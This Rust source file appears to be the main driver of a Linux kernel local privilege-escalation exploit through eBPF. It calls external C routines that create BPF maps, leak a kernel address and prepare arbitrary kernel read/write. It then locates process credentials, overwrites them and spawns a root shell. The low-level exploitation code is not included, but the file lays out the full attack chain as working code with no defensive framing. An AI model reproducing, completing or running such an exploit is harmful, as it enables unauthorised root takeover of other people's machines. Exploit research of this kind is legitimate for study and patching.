use nix::libc;
use nix::unistd::getuid;
use std::fmt::{Debug, Formatter};

const PROC_NUM: usize = 20;

#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Default, Debug)]
struct context_t {
    comm_fd: i32,
    ringbuf_fd: i32,

    arbitrary_read_prog: i32,
    arbitrary_write_prog: i32,

    processes: [libc::pid_t; PROC_NUM],

    array_map: u64, // kaddr ptr
    cred: u64,      // kaddr ptr
    u: ctx_union,
}

#[allow(non_camel_case_types)]
#[repr(C)]
union ctx_union {
    bytes: [u8; 0x1000 * 8],
    words: [u16; 0x1000 * 4],
    dwords: [u32; 0x1000 * 2],
    qwords: [u64; 0x1000],
    ptrs: [u64; 0x1000],
}

impl Default for ctx_union {
    fn default() -> Self {
        Self {
            bytes: [0; 0x1000 * 8],
        }
    }
}

impl Debug for ctx_union {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(f, "ctx_union")
    }
}

extern "C" {
    fn create_bpf_maps(ctx: &mut context_t) -> i32;
    fn do_leak(ctx: &mut context_t) -> i32;
    fn prepare_arbitrary_rw(ctx: &mut context_t) -> i32;
    fn spawn_processes(ctx: &mut context_t) -> i32;
    fn find_cred(ctx: &mut context_t) -> i32;
    fn overwrite_cred(ctx: &mut context_t) -> i32;
    fn spawn_root_shell(ctx: &mut context_t) -> i32;
    fn clean_up(ctx: &mut context_t) -> i32;
}

fn main() -> Result<(), String> {
    let uid = getuid();
    if uid.is_root() {
        Err("You are already root! Exiting!")?;
    }

    let mut ctx = context_t::default();

    unsafe {
        // create BPF maps
        if create_bpf_maps(&mut ctx) < 0 {
            Err("Could not create BPF maps")?;
        };
        // leak kernel address
        if do_leak(&mut ctx) < 0 {
            Err("Could not leak address")?;
        };
        // prepare arbitrary kernel rw
        if prepare_arbitrary_rw(&mut ctx) < 0 {
            Err("Could not prepare arbitrary rw")?;
        };
        // spawn processes
        if spawn_processes(&mut ctx) < 0 {
            Err("Could not spawn processes")?;
        };
        // find process cred(s)
        if find_cred(&mut ctx) < 0 {
            Err("Could not find process creds")?;
        };
        // overwrite cred
        if overwrite_cred(&mut ctx) < 0 {
            Err("Could not overwrite process cred")?;
        };
        // spawn root shell & clean up processes
        if spawn_root_shell(&mut ctx) < 0 {
            Err("Could not spawn root shell")?;
        };
        // clean up everything else
        if clean_up(&mut ctx) < 0 {
            Err("Could not clean up after ourselves. You can ignore this error.")?;
        };
    }
    Ok(())
}
